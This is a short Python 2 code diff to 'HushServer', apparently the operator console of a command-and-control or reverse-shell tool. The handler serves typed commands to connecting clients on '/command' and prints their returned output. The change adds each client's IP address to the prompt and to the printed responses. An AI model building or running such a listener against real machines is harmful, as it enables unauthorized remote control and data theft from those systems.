@@ -5,7 +5,7 @@ import SocketServer
 class HushServer(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/command':
-            cmd = raw_input("Hush> ")
+            cmd = raw_input("Hush" + "@" + self.client_address[0] + "> ")
             print "[+] Executing: " + cmd
             self.send_response(200)
             self.send_header('Content-type','text/html')
@@ -19,7 +19,7 @@ class HushServer(SimpleHTTPServer.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()
-        print "[+] Response: " + self.data_string
+        print "[+] Response from " + self.client_address[0] + ": " + self.data_string
         return
     
     def log_request(self, format, *args):
